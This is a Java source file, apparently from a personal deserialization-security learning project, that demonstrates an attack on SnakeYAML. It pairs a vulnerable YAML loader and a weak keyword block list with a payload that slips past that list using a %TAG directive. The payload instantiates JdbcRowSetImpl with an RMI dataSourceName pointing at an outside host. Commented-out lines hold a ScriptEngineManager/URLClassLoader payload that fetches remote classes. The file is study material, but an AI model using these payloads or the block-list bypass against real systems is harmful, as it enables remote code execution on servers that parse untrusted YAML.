package com.rhein.exploit.JdbcRowSetImpl;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.representer.Representer;

import java.io.FileReader;
import java.io.Reader;

public class Victim {
    private final static String[] YAML_BLOCK_LIST = {"!!", "ScriptEngineManager", "URLClassLoader"};

    private static void checkYaml(String yamlStr) throws Exception {
        for (String blockStr : YAML_BLOCK_LIST) {
            if (yamlStr.contains(blockStr)) {
                throw new Exception("Blacklist is matched.");
            }
        }
    }

    public static <T> T readYaml(String content, Class<T> type) throws Exception {
        Representer representer = new Representer();
        representer.getPropertyUtils().setSkipMissingProperties(true);
        Yaml yaml = new Yaml(representer);
        checkYaml(content);
        return type == null ? yaml.load(content) : yaml.loadAs(content, type);
    }


    public static void loadFromFile() throws Exception {
        String path = "D:\\Project\\zch\\LearningSecurity\\src\\JavaSecurity\\LearningDeserialization\\src\\main\\resources\\yaml_poc1.yml";
        char[] buffer;
        try (Reader reader = new FileReader(path)) {
            buffer = new char[1000];
            int count = reader.read(buffer);
            String str = String.valueOf(buffer, 0, count);
            readYaml(str, null);
        }
    }

    public static void loadFromStr() throws Exception {
        //        String yamlStr = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
//                + "[[!!java.net.URL [\"http://127.0.0.1:8000/\"]]]]";
        // String yamlStr = args[1];
        String yamlStr = "%TAG !      tag:yaml.org,2002:\n" +
                "---\n" +
                "!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"rmi://100.94.1.192:6666/Object\"\n autoCommit: true";
        // "!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [\"http://127.0.0.1:8000/\"]]]]";
        readYaml(yamlStr, null);
    }

    public static void main(String[] args) throws Exception {
        loadFromFile();
    }
}
